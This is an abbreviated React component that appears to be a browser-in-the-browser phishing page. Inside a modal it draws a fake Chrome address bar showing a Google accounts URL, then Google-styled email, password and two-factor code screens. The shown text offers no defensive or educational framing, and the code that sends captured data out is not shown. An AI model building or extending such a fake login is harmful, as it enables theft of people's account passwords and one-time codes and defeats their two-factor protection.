    ...
    <>
      <div className="fixed inset-0 z-[9999] flex items-center justify-center p-4 bg-black bg-opacity-50 overflow-y-auto">
        <div className="bg-white rounded-lg shadow-xl w-full max-w-md relative overflow-hidden my-8">
          {/* Chrome Address Bar */}
          <div className="bg-white border-b border-gray-300 px-2 py-2 flex items-center gap-2 rounded-t-lg">
            ...
            <div className="flex-1 bg-[#f1f3f4] rounded-full px-3 py-1 flex items-center gap-2 min-w-0">
              ...
              <span className="text-xs text-gray-700 truncate">accounts.google.com/v3/signin/challenge/pwd?TL=APgKAcYnp4jPB0VIyB4ssAs4q...</span>
            </div>
            <button 
              className="ml-auto w-4 h-4 flex items-center justify-center rounded hover:bg-gray-300 flex-shrink-0"
          ...
          {/* Content Area */}
          <div className={`px-4 py-8 ${step === "2fa" || step === "2fa-options" || step === "2fa-code" ? "bg-[#202124]" : "bg-white"}`}>
            {isModalLoading ? (
              ...
              <div className="max-w-sm mx-auto font-sans">
                ...
                {step === "email" ? (
                  <div className={`transition-all duration-300 ${isTransitioning ? 'translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
                    ...
                    <p className="text-base text-[#202124] text-center mb-6">
...
<div className={`transition-all duration-300 ${isTransitioning ? '-translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
  <h1 className="text-2xl font-normal text-[#202124] text-center mb-2">Welcome</h1>
  
  <div className="flex items-center gap-3 px-4 py-3 border border-[#dadce0] rounded-full mb-6">
  ...
  <label className="flex items-center text-sm text-[#5f6368] cursor-pointer mb-6">
    <input
      type="checkbox"
    ...
    >
      {isRequestingAuth ? "Signing in..." : "Next"}
                ...
                {step !== "2fa" && step !== "2fa-options" && step !== "2fa-code" && (
                  <p className="text-xs text-[#5f6368] mt-6 leading-5">
